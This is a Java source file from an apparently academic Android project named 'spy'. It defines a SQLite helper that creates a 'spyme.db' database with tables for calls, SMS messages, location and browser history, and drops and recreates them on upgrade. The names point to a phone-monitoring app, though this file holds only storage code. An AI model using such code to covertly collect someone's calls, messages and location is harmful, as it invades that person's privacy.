package edu.uj.jkordas.spy;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import edu.uj.jkordas.spy.dbtables.BrowserHistoryTable;
import edu.uj.jkordas.spy.dbtables.CallTable;
import edu.uj.jkordas.spy.dbtables.LocationTable;
import edu.uj.jkordas.spy.dbtables.SmsTable;


public class DatabaseOpenHelper extends SQLiteOpenHelper {

    public static final String DATABASE_NAME = "spyme.db";
    public static final int DATABASE_VERSION = 3;

    public DatabaseOpenHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase database) {
        database.execSQL(CallTable.DATABASE_CREATE);
        database.execSQL(SmsTable.DATABASE_CREATE);
        database.execSQL(LocationTable.DATABASE_CREATE);
        database.execSQL(BrowserHistoryTable.DATABASE_CREATE);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        Log.w(DatabaseOpenHelper.class.getName(), "Upgrading database from version " + oldVersion
                + " to " + newVersion + ", which will destroy all old data");
        db.execSQL("DROP TABLE IF EXISTS " + CallTable.TABLE_CALL);
        db.execSQL("DROP TABLE IF EXISTS " + SmsTable.TABLE_SMS);
        db.execSQL("DROP TABLE IF EXISTS " + LocationTable.TABLE_LOCATION);
        db.execSQL("DROP TABLE IF EXISTS " + BrowserHistoryTable.TABLE_BROWSER_HISTORY);

        onCreate(db);
    }

}
